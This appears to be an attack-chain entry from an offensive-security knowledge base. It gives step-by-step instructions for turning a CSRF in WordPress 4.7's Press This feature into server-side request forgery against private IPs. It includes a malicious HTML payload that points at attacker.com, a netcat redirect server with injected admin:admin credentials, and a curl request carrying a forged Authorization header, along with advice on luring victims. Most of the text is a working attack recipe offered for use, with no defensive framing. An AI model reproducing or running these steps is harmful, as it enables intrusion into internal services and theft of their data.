---
id: ac-wordpress-csrf-ssrf-187520
tags:
  - ssrf
  - csrf
  - wordpress
  - web
  - internal-access
  - basic-auth-injection
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T12:00:00Z'
procedures:
  - '[[procedures/Ensure-Victim-Privileges-for-Press-This]]'
  - '[[procedures/Deliver-CSRF-Payload-via-Malicious-HTML]]'
  - '[[procedures/Trigger-Scrape-Request-from-Victims-Browser]]'
  - '[[procedures/Respond-with-Redirect-to-Private-IP-from-Attacker-Domain]]'
  - '[[procedures/Follow-Redirect-to-Access-Internal-Endpoint-with-Basic-Auth]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:31:30.718Z'
description: >-
  A multi-stage attack exploiting CSRF in WordPress 4.7's Press This feature to
  trigger SSRF, bypassing IP/port filters via redirects to access internal
  services with injected basic auth headers.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
---
# WordPress Press This CSRF to SSRF for Private IP Access and Basic Auth Injection

Multi-stage attack chain demonstrating a complete attack workflow exploiting CSRF in WordPress 4.7's Press This feature to achieve SSRF, allowing access to any private IP and port while injecting basic auth headers to compromise internal services.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Ensure Victim Access] --> B[Deliver CSRF Payload]
    B --> C[Trigger Scrape Request]
    C --> D[Respond with Redirect]
    D --> E[Access Internal Endpoint]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (relies on web server for hosting malicious HTML and redirect responses)

### Target Environment

- WordPress 4.7 running on PHP
- Press This feature enabled
- Open ports: 80, 443, 8080 (external), arbitrary private ports (e.g., 12345, 11211)

### Initial Access Requirements

- Victim must be authenticated WordPress user with Press This privileges
- Attacker controls a domain for hosting CSRF payload and redirect server
- Network access to victim's WordPress instance

## Detailed Attack Procedures

### Step 1: Ensure Victim Privileges for Press This
procedure: [[procedures/Ensure-Victim-Privileges-for-Press-This]]

**Objective**: Verify the victim has an active session and access to the Press This feature to enable CSRF exploitation.

**Instructions**: Confirm the victim is logged in as an authenticated user capable of using Press This. No direct commands needed; this is a prerequisite check via social engineering or prior phishing to maintain session.

**Expected Output**: Victim loads a page with the malicious HTML, triggering the CSRF.

**Success Indicators**:
- Victim has active WordPress session
- Press This feature accessible (e.g., via wp-admin/press-this.php)

### Step 2: Deliver CSRF Payload via Malicious HTML
procedure: [[procedures/Deliver-CSRF-Payload-via-Malicious-HTML]]

**Objective**: Trick the victim into loading HTML that forges a CSRF request to the WordPress Press This endpoint.

**Instructions**: Host malicious HTML on attacker's domain with an <img> tag that submits the CSRF form. Use [[commands/create-csrf-html-payload]] to generate the HTML:

```bash
# Simulate creation of HTML file
cat > malicious.html << EOF
<html><body><img src="//target.com/wp-admin/press-this.php?u=http://attacker.com&url-scan-submit=Scan" onload="this.src=this.src"></body></html>
EOF
```

Serve this via a web server (e.g., python -m http.server) and lure victim to load it.

**Expected Output**: Browser sends forged GET request to wp-admin/press-this.php.

**Success Indicators**:
- Malicious HTML loaded in victim's browser
- CSRF request observed in network logs

### Step 3: Trigger Scrape Request from Victim's Browser
procedure: [[procedures/Trigger-Scrape-Request-from-Victims-Browser]]

**Objective**: Have the WordPress server process the CSRF and initiate a scrape from the attacker's domain.

**Instructions**: Upon CSRF hit, WordPress fetches content from the specified u= parameter (attacker.com). Monitor server logs or use [[commands/monitor-wordpress-scrape]] to confirm:

```bash
# Tail WordPress logs or use curl to simulate verification
tail -f /var/log/wordpress/access.log | grep "press-this.php"
```

**Expected Output**: WordPress server issues HTTP GET to attacker.com.

**Success Indicators**:
- Request to attacker domain from WordPress IP
- Scrape initiation logged

### Step 4: Respond with Redirect to Private IP from Attacker Domain
procedure: [[procedures/Respond-with-Redirect-to-Private-IP-from-Attacker-Domain]]

**Objective**: Serve a 302 redirect from attacker domain to the target private IP:port, optionally with basic auth.

**Instructions**: Configure attacker server to respond with Location header. Use [[commands/serve-redirect-response]] to set up a simple HTTP server:

```bash
# Using netcat or similar to respond with redirect (simulate with curl for testing)
echo -e "HTTP/1.1 302 Found\r\nLocation: http://192.168.0.1:12345\r\n\r\n" | nc -l 80
```

For basic auth variant: Replace Location with "http://admin:admin@192.168.0.1:12345".

**Expected Output**: WordPress receives 302 and follows to private IP.

**Success Indicators**:
- Redirect response sent
- Follow-up request to private IP observed on internal network

### Step 5: Follow Redirect to Access Internal Endpoint with Basic Auth
procedure: [[procedures/Follow-Redirect-to-Access-Internal-Endpoint-with-Basic-Auth]]

**Objective**: Exploit the SSRF to send requests to internal services, injecting auth headers.

**Instructions**: WordPress automatically follows; monitor internal service logs. Simulate the resulting request with [[commands/simulate-ssrf-request]]:

```bash
curl -H "Host: 192.168.0.1:12345" -H "Authorization: Basic YWRtaW46YWRtaW4=" -H "User-Agent: Press This (WordPress/4.7-RC1)" http://192.168.0.1:12345/
```

**Expected Output**: HTTP response from internal service, potentially with sensitive data.

**Success Indicators**:
- Internal service receives request with injected headers
- Data exfiltration or service compromise

## Attack Chain Summary

### Key Achievements

1. Bypassed WordPress IP/port filters via external redirect
2. Accessed arbitrary private IPs/ports (e.g., 192.168.0.1:12345)
3. Injected basic auth credentials to authenticate to internal services

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Drive-by Compromise]] Drive-by Compromise

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Discovery]] Discovery

---
*Last updated: 2023-10-01T12:00:00Z*
